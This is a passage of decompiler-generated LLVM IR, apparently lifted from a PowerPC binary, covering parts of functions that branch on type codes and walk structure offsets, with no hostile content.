  %v3_1000d498 = icmp eq i32 %v3_1000d494, 8
  store i1 %v2_1000d498, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d498, label %dec_label_pc_1000d5c0, label %dec_label_pc_1000d4a0

dec_label_pc_1000d4a0:                            ; preds = %dec_label_pc_1000d48c
  %v1_1000d4a0 = add i32 %v2_1000d59c, 76
  store i32 %v1_1000d4a0, i32* %r10.global-to-local, align 4
  br i1 %v2_1000d498, label %dec_label_pc_1000d4bc, label %dec_label_pc_1000d4a8

dec_label_pc_1000d4a8:                            ; preds = %dec_label_pc_1000d4a0
  %v2_1000d4a8 = icmp sgt i32 %v3_1000d494, 2
  store i1 %v2_1000d4a8, i1* %cr7_gt.global-to-local, align 1
  %tmp27 = icmp slt i32 %v3_1000d494, 3
  br i1 %tmp27, label %dec_label_pc_1000d584, label %dec_label_pc_1000d4d4

dec_label_pc_1000d4bc:                            ; preds = %dec_label_pc_1000d4a0
  %v2_1000d4bc = icmp sgt i32 %v3_1000d494, 1024
  store i1 %v2_1000d4bc, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = icmp slt i32 %v3_1000d494, 1025
  br i1 %tmp28, label %dec_label_pc_1000d584, label %dec_label_pc_1000d4c8

dec_label_pc_1000d4c8:                            ; preds = %dec_label_pc_1000d4bc
  %v2_1000d4c8 = icmp sgt i32 %v3_1000d494, 2048
  %v3_1000d4c8 = icmp eq i32 %v3_1000d494, 2048
  store i1 %v2_1000d4c8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d4c8, label %dec_label_pc_1000d4dc, label %dec_label_pc_1000d4d0

dec_label_pc_1000d4d0:                            ; preds = %dec_label_pc_1000d4c8
  %v2_1000d4d0 = icmp sgt i32 %v3_1000d494, 2055
  %v3_1000d4d0 = icmp eq i32 %v3_1000d494, 2055
  store i1 %v2_1000d4d0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d4d0, label %dec_label_pc_1000d538, label %dec_label_pc_1000d584

dec_label_pc_1000d4d4:                            ; preds = %dec_label_pc_1000d4a8
  %v3_1000d4b4 = icmp eq i32 %v3_1000d494, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d4b4, label %dec_label_pc_1000d538, label %dec_label_pc_1000d584

dec_label_pc_1000d4dc:                            ; preds = %dec_label_pc_1000d4c8
  %v2_1000d4dc = inttoptr i32 %v1_1000d4a0 to i8*
  %v3_1000d4dc = load i8, i8* %v2_1000d4dc, align 1
  %v4_1000d4dc = zext i8 %v3_1000d4dc to i32
  store i32 %v4_1000d4dc, i32* %r0.global-to-local, align 4
  %tmp32 = urem i8 %v3_1000d4dc, 2
  %v1_1000d4e0 = zext i8 %tmp32 to i32
  %v2_1000d4e4 = icmp ugt i8 %v3_1000d4dc, 6
  store i1 %v2_1000d4e4, i1* %cr7_gt.global-to-local, align 1
  %v2_1000d4e8 = add nuw nsw i32 %v1_1000d4e0, %v4_1000d4dc
  store i32 %v2_1000d4e8, i32* %r9.global-to-local, align 4
  %v1_1000d4ec = trunc i32 %v2_1000d4e8 to i8
  store i8 %v1_1000d4ec, i8* %v2_1000d4dc, align 1
  %v0_1000d4f0 = load i1, i1* %cr7_gt.global-to-local, align 1
  %v0_1000d510 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_1000d4f0, label %dec_label_pc_1000d510, label %dec_label_pc_1000d4f4

dec_label_pc_1000d4f4:                            ; preds = %dec_label_pc_1000d4dc
  %v1_1000d4f4 = add i32 %v0_1000d510, 8
  %v2_1000d4f4 = inttoptr i32 %v1_1000d4f4 to i32*
  %v3_1000d4f4 = load i32, i32* %v2_1000d4f4, align 4
  store i32 %v3_1000d4f4, i32* %r0.global-to-local, align 4
  %v0_1000d4f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d4f8 = urem i32 %v0_1000d4f8, 256
  %v1_1000d4fc = mul nuw nsw i32 %v1_1000d4f8, 4
  store i32 %v1_1000d4fc, i32* %r11.global-to-local, align 4
  %v1_1000d500 = add nuw nsw i32 %v1_1000d4f8, 2
  store i32 %v1_1000d500, i32* %r9.global-to-local, align 4
  %v1_1000d504 = trunc i32 %v1_1000d500 to i8
  %v2_1000d504 = load i32, i32* @r3, align 4
  %v3_1000d504 = add i32 %v2_1000d504, 76
  %v4_1000d504 = inttoptr i32 %v3_1000d504 to i8*
  store i8 %v1_1000d504, i8* %v4_1000d504, align 1
  %v0_1000d508 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d508 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d508 = add i32 %v1_1000d508, %v0_1000d508
  store i32 %v2_1000d508, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d524

dec_label_pc_1000d510:                            ; preds = %dec_label_pc_1000d4dc
  %v1_1000d510 = add i32 %v0_1000d510, 4
  %v2_1000d510 = inttoptr i32 %v1_1000d510 to i32*
  %v3_1000d510 = load i32, i32* %v2_1000d510, align 4
  %v1_1000d514 = add i32 %v3_1000d510, 7
  store i32 %v1_1000d514, i32* %r9.global-to-local, align 4
  %v1_1000d518 = call i32 @__asm_rlwinm(i32 %v1_1000d514, i32 0, i32 0, i32 28)
  store i32 %v1_1000d518, i32* %r11.global-to-local, align 4
  %v1_1000d51c = add i32 %v1_1000d518, 8
  store i32 %v1_1000d51c, i32* %r0.global-to-local, align 4
  %v1_1000d520 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d520 = add i32 %v1_1000d520, 4
  %v3_1000d520 = inttoptr i32 %v2_1000d520 to i32*
  store i32 %v1_1000d51c, i32* %v3_1000d520, align 4
  %v0_1000d524.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d524

dec_label_pc_1000d524:                            ; preds = %dec_label_pc_1000d4f4, %dec_label_pc_1000d510
  %v0_1000d524 = phi i32 [ %v2_1000d508, %dec_label_pc_1000d4f4 ], [ %v0_1000d524.pre, %dec_label_pc_1000d510 ]
  %v1_1000d524 = inttoptr i32 %v0_1000d524 to i32*
  %v2_1000d524 = load i32, i32* %v1_1000d524, align 4
  store i32 %v2_1000d524, i32* %r9.global-to-local, align 4
  %v1_1000d528 = add i32 %v0_1000d524, 4
  %v2_1000d528 = inttoptr i32 %v1_1000d528 to i32*
  %v3_1000d528 = load i32, i32* %v2_1000d528, align 4
  store i32 %v3_1000d528, i32* %r10.global-to-local, align 4
  %v1_1000d52c = load i32, i32* @r8, align 4
  %v2_1000d52c = inttoptr i32 %v1_1000d52c to i32*
  store i32 %v2_1000d524, i32* %v2_1000d52c, align 4
  %v0_1000d530 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d530 = load i32, i32* @r8, align 4
  %v2_1000d530 = add i32 %v1_1000d530, 4
  %v3_1000d530 = inttoptr i32 %v2_1000d530 to i32*
  store i32 %v0_1000d530, i32* %v3_1000d530, align 4
  br label %dec_label_pc_1000d5bc

dec_label_pc_1000d538:                            ; preds = %dec_label_pc_1000d4d0, %dec_label_pc_1000d4d4
  store i32 %v1_1000d4a0, i32* %r10.global-to-local, align 4
  %v1_1000d53c = add i32 %v2_1000d59c, 77
  %v2_1000d53c = inttoptr i32 %v1_1000d53c to i8*
  %v3_1000d53c = load i8, i8* %v2_1000d53c, align 1
  %v4_1000d53c = zext i8 %v3_1000d53c to i32
  store i32 %v4_1000d53c, i32* %r11.global-to-local, align 4
  %v2_1000d540 = icmp ugt i8 %v3_1000d53c, 8
  store i1 %v2_1000d540, i1* %cr7_gt.global-to-local, align 1
  %tmp29 = icmp ugt i8 %v3_1000d53c, 7
  br i1 %tmp29, label %dec_label_pc_1000d564, label %dec_label_pc_1000d548

dec_label_pc_1000d548:                            ; preds = %dec_label_pc_1000d538
  %v1_1000d548 = add i32 %v2_1000d59c, 84
  %v2_1000d548 = inttoptr i32 %v1_1000d548 to i32*
  %v3_1000d548 = load i32, i32* %v2_1000d548, align 4
  store i32 %v3_1000d548, i32* %r9.global-to-local, align 4
  %v1_1000d54c = mul nuw nsw i32 %v4_1000d53c, 8
  store i32 %v1_1000d54c, i32* %r0.global-to-local, align 4
  %v1_1000d550 = add nuw nsw i32 %v4_1000d53c, 1
  store i32 %v1_1000d550, i32* %r11.global-to-local, align 4
  %v1_1000d554 = trunc i32 %v1_1000d550 to i8
  store i8 %v1_1000d554, i8* %v2_1000d53c, align 1
  %v0_1000d558 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d558 = add i32 %v0_1000d558, 32
  %v1_1000d55c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d55c = add i32 %v1_1000d558, %v1_1000d55c
  store i32 %v2_1000d55c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d5bc

dec_label_pc_1000d564:                            ; preds = %dec_label_pc_1000d538
  %v1_1000d564 = add i32 %v2_1000d59c, 80
  %v2_1000d564 = inttoptr i32 %v1_1000d564 to i32*
  %v3_1000d564 = load i32, i32* %v2_1000d564, align 4
  %v1_1000d568 = add i32 %v3_1000d564, 7
  store i32 %v1_1000d568, i32* %r9.global-to-local, align 4
  %v1_1000d56c = call i32 @__asm_rlwinm(i32 %v1_1000d568, i32 0, i32 0, i32 28)
  store i32 %v1_1000d56c, i32* %r9.global-to-local, align 4
  %v1_1000d570 = add i32 %v1_1000d56c, 8
  store i32 %v1_1000d570, i32* %r0.global-to-local, align 4
  %v1_1000d574 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d574 = add i32 %v1_1000d574, 4
  %v3_1000d574 = inttoptr i32 %v2_1000d574 to i32*
  store i32 %v1_1000d570, i32* %v3_1000d574, align 4
  br label %dec_label_pc_1000d5bc

dec_label_pc_1000d584:                            ; preds = %dec_label_pc_1000d4d0, %dec_label_pc_1000d4d4, %dec_label_pc_1000d4bc, %dec_label_pc_1000d4a8
  %v2_1000d584 = inttoptr i32 %v1_1000d4a0 to i8*
  %v3_1000d584 = load i8, i8* %v2_1000d584, align 1
  %v4_1000d584 = zext i8 %v3_1000d584 to i32
  store i32 %v4_1000d584, i32* %r11.global-to-local, align 4
  %v2_1000d588 = icmp ugt i8 %v3_1000d584, 8
  store i1 %v2_1000d588, i1* %cr7_gt.global-to-local, align 1
  %tmp30 = icmp ugt i8 %v3_1000d584, 7
  br i1 %tmp30, label %dec_label_pc_1000d5a8, label %dec_label_pc_1000d590

dec_label_pc_1000d590:                            ; preds = %dec_label_pc_1000d584
  %v1_1000d590 = add i32 %v2_1000d59c, 84
  %v2_1000d590 = inttoptr i32 %v1_1000d590 to i32*
  %v3_1000d590 = load i32, i32* %v2_1000d590, align 4
  store i32 %v3_1000d590, i32* %r0.global-to-local, align 4
  %v1_1000d594 = mul nuw nsw i32 %v4_1000d584, 4
  store i32 %v1_1000d594, i32* %r9.global-to-local, align 4
  %v1_1000d598 = add nuw nsw i32 %v4_1000d584, 1
  store i32 %v1_1000d598, i32* %r11.global-to-local, align 4
  %v1_1000d59c = trunc i32 %v1_1000d598 to i8
  store i8 %v1_1000d59c, i8* %v2_1000d584, align 1
  %v0_1000d5a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d5a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d5a0 = add i32 %v1_1000d5a0, %v0_1000d5a0
  store i32 %v2_1000d5a0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d5b4

dec_label_pc_1000d5a8:                            ; preds = %dec_label_pc_1000d584
  %v1_1000d5a8 = add i32 %v2_1000d59c, 80
  %v2_1000d5a8 = inttoptr i32 %v1_1000d5a8 to i32*
  %v3_1000d5a8 = load i32, i32* %v2_1000d5a8, align 4
  store i32 %v3_1000d5a8, i32* %r9.global-to-local, align 4
  %v1_1000d5ac = add i32 %v3_1000d5a8, 4
  store i32 %v1_1000d5ac, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d5ac, i32* %v2_1000d5a8, align 4
  %v0_1000d5b4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d5b4

dec_label_pc_1000d5b4:                            ; preds = %dec_label_pc_1000d590, %dec_label_pc_1000d5a8
  %v0_1000d5b4 = phi i32 [ %v2_1000d5a0, %dec_label_pc_1000d590 ], [ %v0_1000d5b4.pre, %dec_label_pc_1000d5a8 ]
  %v1_1000d5b4 = inttoptr i32 %v0_1000d5b4 to i32*
  %v2_1000d5b4 = load i32, i32* %v1_1000d5b4, align 4
  store i32 %v2_1000d5b4, i32* %r0.global-to-local, align 4
  %v1_1000d5b8 = load i32, i32* @r8, align 4
  %v2_1000d5b8 = inttoptr i32 %v1_1000d5b8 to i32*
  store i32 %v2_1000d5b4, i32* %v2_1000d5b8, align 4
  br label %dec_label_pc_1000d5bc

dec_label_pc_1000d5bc:                            ; preds = %dec_label_pc_1000d564, %dec_label_pc_1000d548, %dec_label_pc_1000d524, %dec_label_pc_1000d5b4
  %v0_1000d5bc = load i32, i32* @r8, align 4
  %v1_1000d5bc = add i32 %v0_1000d5bc, 8
  store i32 %v1_1000d5bc, i32* @r8, align 4
  %v0_1000d5c0.pre = load i32, i32* @r7, align 4
  %v0_1000d5c4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d5c0

dec_label_pc_1000d5c0:                            ; preds = %dec_label_pc_1000d48c, %dec_label_pc_1000d5bc
  %v0_1000d5c4 = phi i32 [ %v2_1000d59c, %dec_label_pc_1000d48c ], [ %v0_1000d5c4.pre, %dec_label_pc_1000d5bc ]
  %v0_1000d5c0 = phi i32 [ %v0_1000d48c, %dec_label_pc_1000d48c ], [ %v0_1000d5c0.pre, %dec_label_pc_1000d5bc ]
  %v1_1000d5c0 = add i32 %v0_1000d5c0, 1
  store i32 %v1_1000d5c0, i32* @r7, align 4
  %v1_1000d5c4 = add i32 %v0_1000d5c4, 28
  %v2_1000d5c4 = inttoptr i32 %v1_1000d5c4 to i32*
  %v3_1000d5c4 = load i32, i32* %v2_1000d5c4, align 4
  store i32 %v3_1000d5c4, i32* %r0.global-to-local, align 4
  %v2_1000d5c8 = icmp slt i32 %v1_1000d5c0, %v3_1000d5c4
  %v3_1000d5c8 = icmp sgt i32 %v1_1000d5c0, %v3_1000d5c4
  store i1 %v3_1000d5c8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000d5c8, label %dec_label_pc_1000d48c, label %dec_label_pc_1000d614

dec_label_pc_1000d5d4:                            ; preds = %dec_label_pc_1000d3d4
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000d5d8 = icmp ne i32 %v3_1000d3dc, -2147483648
  %v4_1000d5d8 = icmp eq i32 %v3_1000d3dc, -2147483648
  store i1 %v3_1000d5d8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d5d8, label %dec_label_pc_1000d5e0, label %dec_label_pc_1000d5f4

dec_label_pc_1000d5e0:                            ; preds = %dec_label_pc_1000d5d4
  %v1_1000d5e0 = add i32 %v0_1000d3d4, 36
  %v2_1000d5e0 = inttoptr i32 %v1_1000d5e0 to i8*
  %v3_1000d5e0 = load i8, i8* %v2_1000d5e0, align 1
  %v4_1000d5e0 = zext i8 %v3_1000d5e0 to i32
  %v1_1000d5e4 = mul nuw nsw i32 %v4_1000d5e0, 8
  %v2_1000d5e8 = add i32 %v1_1000d5e4, %v1_1000d3d8
  store i32 %v2_1000d5e8, i32* %r9.global-to-local, align 4
  %v1_1000d5ec = add i32 %v2_1000d5e8, -8
  %v2_1000d5ec = inttoptr i32 %v1_1000d5ec to i32*
  %v3_1000d5ec = load i32, i32* %v2_1000d5ec, align 4
  store i32 %v3_1000d5ec, i32* %r0.global-to-local, align 4
  store i32 %v3_1000d5ec, i32* %v2_1000d3dc, align 4
  %v0_1000d5f4.pre = load i32, i32* @r3, align 4
  %v1_1000d5f8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d5f4

dec_label_pc_1000d5f4:                            ; preds = %dec_label_pc_1000d5d4, %dec_label_pc_1000d5e0
  %v1_1000d5f8 = phi i32 [ -2147483648, %dec_label_pc_1000d5d4 ], [ %v1_1000d5f8.pre, %dec_label_pc_1000d5e0 ]
  %v1_1000d610 = phi i32 [ %v0_1000d3d4, %dec_label_pc_1000d5d4 ], [ %v0_1000d5f4.pre, %dec_label_pc_1000d5e0 ]
  %v1_1000d5f4 = add i32 %v1_1000d610, 4
  %v2_1000d5f4 = inttoptr i32 %v1_1000d5f4 to i32*
  %v3_1000d5f4 = load i32, i32* %v2_1000d5f4, align 4
  store i32 %v3_1000d5f4, i32* %r0.global-to-local, align 4
  %v3_1000d5f8 = icmp sgt i32 %v3_1000d5f4, %v1_1000d5f8
  %v4_1000d5f8 = icmp eq i32 %v3_1000d5f4, %v1_1000d5f8
  store i1 %v3_1000d5f8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d5f8, label %dec_label_pc_1000d600, label %dec_label_pc_1000d614

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d5f4
  %v1_1000d600 = add i32 %v1_1000d610, 37
  %v2_1000d600 = inttoptr i32 %v1_1000d600 to i8*
  %v3_1000d600 = load i8, i8* %v2_1000d600, align 1
  %v4_1000d600 = zext i8 %v3_1000d600 to i32
  %v1_1000d604 = mul nuw nsw i32 %v4_1000d600, 8
  %v1_1000d608 = load i32, i32* @r8, align 4
  %v2_1000d608 = add i32 %v1_1000d604, %v1_1000d608
  store i32 %v2_1000d608, i32* %r9.global-to-local, align 4
  %v1_1000d60c = add i32 %v2_1000d608, -8
  %v2_1000d60c = inttoptr i32 %v1_1000d60c to i32*
  %v3_1000d60c = load i32, i32* %v2_1000d60c, align 4
  store i32 %v3_1000d60c, i32* %r0.global-to-local, align 4
  store i32 %v3_1000d60c, i32* %v2_1000d5f4, align 4
  %v0_1000d614.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d614

dec_label_pc_1000d614:                            ; preds = %dec_label_pc_1000d5c0, %dec_label_pc_1000d5c4.preheader, %dec_label_pc_1000d5f4, %dec_label_pc_1000d600
  %v0_1000d614 = phi i32 [ %v1_1000d610, %dec_label_pc_1000d5f4 ], [ %v0_1000d614.pre, %dec_label_pc_1000d600 ], [ %v0_1000d5c45, %dec_label_pc_1000d5c4.preheader ], [ %v0_1000d5c4, %dec_label_pc_1000d5c0 ]
  %v1_1000d614 = add i32 %v0_1000d614, 8
  %v2_1000d614 = inttoptr i32 %v1_1000d614 to i32*
  %v3_1000d614 = load i32, i32* %v2_1000d614, align 4
  store i32 %v3_1000d614, i32* %r11.global-to-local, align 4
  %v2_1000d618 = icmp sgt i32 %v3_1000d614, 0
  store i1 %v2_1000d618, i1* %cr7_gt.global-to-local, align 1
  %v0_1000d61c = load i32, i32* @lr, align 4
  %tmp31 = icmp sgt i32 %v3_1000d614, -1
  call void @__pseudo_cond_branch(i1 %tmp31, i32 %v0_1000d61c)
  %v0_1000d620 = load i32, i32* @r3, align 4
  %v1_1000d620 = add i32 %v0_1000d620, 16
  %v2_1000d620 = inttoptr i32 %v1_1000d620 to i32*
  %v3_1000d620 = load i32, i32* %v2_1000d620, align 4
  store i32 %v3_1000d620, i32* %r0.global-to-local, align 4
  %v0_1000d624 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d624 = sub i32 0, %v0_1000d624
  store i32 %v1_1000d624, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000d62c = add i32 %v0_1000d620, 8
  %v3_1000d62c = inttoptr i32 %v2_1000d62c to i32*
  store i32 %v1_1000d624, i32* %v3_1000d62c, align 4
  %v0_1000d630 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d630 = load i32, i32* @r3, align 4
  %v2_1000d630 = add i32 %v1_1000d630, 20
  %v3_1000d630 = inttoptr i32 %v2_1000d630 to i32*
  store i32 %v0_1000d630, i32* %v3_1000d630, align 4
  %v0_1000d634 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d634 = or i32 %v0_1000d634, 8
  store i32 %v1_1000d634, i32* %r0.global-to-local, align 4
  %v1_1000d638 = call i32 @__asm_rlwinm(i32 %v1_1000d634, i32 0, i32 0, i32 30)
  store i32 %v1_1000d638, i32* %r0.global-to-local, align 4
  %v1_1000d63c = load i32, i32* @r3, align 4
  %v2_1000d63c = add i32 %v1_1000d63c, 16
  %v3_1000d63c = inttoptr i32 %v2_1000d63c to i32*
  store i32 %v1_1000d638, i32* %v3_1000d63c, align 4
  %v0_1000d640 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d640

; uselistorder directives
  uselistorder i32 %v3_1000d5f4, { 1, 0, 2 }
  uselistorder i32 %v1_1000d5f8, { 1, 0 }
  uselistorder i32 %v3_1000d5c4, { 1, 0, 2 }
  uselistorder i32 %v1_1000d5c0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000d5c4, { 0, 2, 1 }
  uselistorder i32 %v4_1000d584, { 1, 0, 2 }
  uselistorder i32 %v4_1000d53c, { 1, 0, 2 }
  uselistorder i32 %v0_1000d524, { 1, 0 }
  uselistorder i32 %v1_1000d4f8, { 1, 0 }
  uselistorder i32 %v0_1000d510, { 1, 0 }
  uselistorder i8 %v3_1000d4dc, { 1, 0, 2 }
  uselistorder i32 %v1_1000d4a0, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000d494, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000d48c, { 1, 0 }
  uselistorder i32 %v2_1000d59c, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000d5c45, { 1, 0, 2 }
  uselistorder i32 %v4_1000d444, { 1, 0, 2 }
  uselistorder i32 %v3_1000d434, { 1, 0, 2 }
  uselistorder i32 %v2_1000d460, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v4_1000d3f4, { 1, 0, 2 }
  uselistorder i32 %v3_1000d3dc, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000d3d4, { 1, 0, 2 }
  uselistorder i32 %v0_1000d3d4, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 20, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i1* %cr7_gt.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 0, 19, 9, 10, 11, 12, 1, 14, 15, 16, 17, 18 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 88, { 1, 0 }
  uselistorder label %dec_label_pc_1000d614, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d5f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5bc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d5b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d584, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000d538, { 1, 0 }
  uselistorder label %dec_label_pc_1000d524, { 1, 0 }
  uselistorder label %dec_label_pc_1000d48c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000d478, { 1, 0 }
  uselistorder label %dec_label_pc_1000d434, { 1, 0 }
  uselistorder label %dec_label_pc_1000d428, { 1, 0 }
}

define i32 @function_1000d644(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d644:
  br label %dec_label_pc_1000d650

dec_label_pc_1000d650:                            ; preds = %dec_label_pc_1000d650, %dec_label_pc_1000d644
  %v0_1000d650 = phi i32 [ ptrtoint (i32* @global_var_10019510.720 to i32), %dec_label_pc_1000d644 ], [ %v1_1000d650, %dec_label_pc_1000d650 ]
  %v1_1000d650 = add i32 %v0_1000d650, -2
  %v2_1000d650 = inttoptr i32 %v1_1000d650 to i16*
  %v3_1000d650 = load i16, i16* %v2_1000d650, align 2
  %v4_1000d650 = sext i16 %v3_1000d650 to i32
  %v4_1000d654 = icmp eq i32 %v4_1000d650, %arg1
  %v3_1000d658.not = icmp ule i32 %v1_1000d650, ptrtoint (i32* @global_var_100194f8.721 to i32)
  %brmerge = or i1 %v4_1000d654, %v3_1000d658.not
  br i1 %brmerge, label %dec_label_pc_1000d664, label %dec_label_pc_1000d650

dec_label_pc_1000d664:                            ; preds = %dec_label_pc_1000d650
  %v2_1000d66c = sub i32 %v1_1000d650, ptrtoint (i32* @global_var_100194f8.721 to i32)
  %v1_1000d674 = udiv i32 %v2_1000d66c, 2
  %v2_1000d674 = and i32 %v2_1000d66c, -2147483648
  %v3_1000d674 = or i32 %v1_1000d674, %v2_1000d674
  %v2_1000d67c = add i32 %v3_1000d674, ptrtoint (i32* @global_var_10019510.720 to i32)
  %v3_1000d67c = inttoptr i32 %v2_1000d67c to i8*
  %v4_1000d67c = load i8, i8* %v3_1000d67c, align 1
  %v5_1000d67c = zext i8 %v4_1000d67c to i32
  ret i32 %v5_1000d67c

; uselistorder directives
  uselistorder i32 %v2_1000d66c, { 1, 0 }
  uselistorder i32 %v1_1000d650, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_100194f8.721 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10019510.720 to i32), { 1, 0 }
}

define i32 @function_1000d684(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d684:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000d688 = load i32, i32* @lr, align 4
  store i32 %v0_1000d688, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 8, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000d6a0 = add i32 %tmp, 16
  %v2_1000d6a0 = inttoptr i32 %v1_1000d6a0 to i32*
  %v3_1000d6a0 = load i32, i32* %v2_1000d6a0, align 4
  store i32 %v3_1000d6a0, i32* %r0.global-to-local, align 4
  %v1_1000d6b0 = and i32 %v3_1000d6a0, 128
  store i32 %v1_1000d6b0, i32* %r5.global-to-local, align 4
  %v3_1000d6b0 = icmp eq i32 %v1_1000d6b0, 0
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000d6b8 = add i32 %tmp, 24
  %v2_1000d6b8 = inttoptr i32 %v1_1000d6b8 to i32*
  %v3_1000d6b8 = load i32, i32* %v2_1000d6b8, align 4
  store i32 %v3_1000d6b8, i32* @r26, align 4
  br i1 %v3_1000d6b0, label %dec_label_pc_1000d6c0, label %dec_label_pc_1000d6d8

dec_label_pc_1000d6c0:                            ; preds = %dec_label_pc_1000d684
  %v2_1000d6c0 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000d72c

dec_label_pc_1000d6d0:                            ; preds = %dec_label_pc_1000d900
  %v1_1000d6d0 = add i32 %v0_1000d8d0, 1
  store i32 %v1_1000d6d0, i32* @r30, align 4
  br label %dec_label_pc_1000d918

dec_label_pc_1000d6d8:                            ; preds = %dec_label_pc_1000d684
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000d6dc = load i32, i32* %arg1, align 4
  store i32 %v2_1000d6dc, i32* @r7, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000d6e8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000d6e8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000d6ec

dec_label_pc_1000d6ec:                            ; preds = %dec_label_pc_1000d71c.dec_label_pc_1000d6ec_crit_edge, %dec_label_pc_1000d6d8
  %v0_1000d6f4 = phi i32 [ %v0_1000d6f4.pre, %dec_label_pc_1000d71c.dec_label_pc_1000d6ec_crit_edge ], [ %v2_1000d6dc, %dec_label_pc_1000d6d8 ]
  %v0_1000d6f0 = phi i32 [ %v0_1000d6f0.pre, %dec_label_pc_1000d71c.dec_label_pc_1000d6ec_crit_edge ], [ %v2_1000d6e8, %dec_label_pc_1000d6d8 ]
  %v0_1000d6f8 = phi i32 [ %v0_1000d6ec.pre, %dec_label_pc_1000d71c.dec_label_pc_1000d6ec_crit_edge ], [ 0, %dec_label_pc_1000d6d8 ]
  %v1_1000d6ec = mul i32 %v0_1000d6f8, 4
  %v2_1000d6f0 = add i32 %v0_1000d6f8, %v0_1000d6f0
  store i32 %v2_1000d6f0, i32* %r10.global-to-local, align 4
  %v2_1000d6f4 = add i32 %v1_1000d6ec, %v0_1000d6f4
  store i32 %v2_1000d6f4, i32* %r11.global-to-local, align 4
  %v1_1000d6f8 = add i32 %v0_1000d6f8, 1
  store i32 %v1_1000d6f8, i32* @r8, align 4
  %v1_1000d6fc = add i32 %v2_1000d6f4, -4
  %v2_1000d6fc = inttoptr i32 %v1_1000d6fc to i32*
  %v3_1000d6fc = load i32, i32* %v2_1000d6fc, align 4
  store i32 %v3_1000d6fc, i32* %r9.global-to-local, align 4
  %v1_1000d700 = trunc i32 %v3_1000d6fc to i8
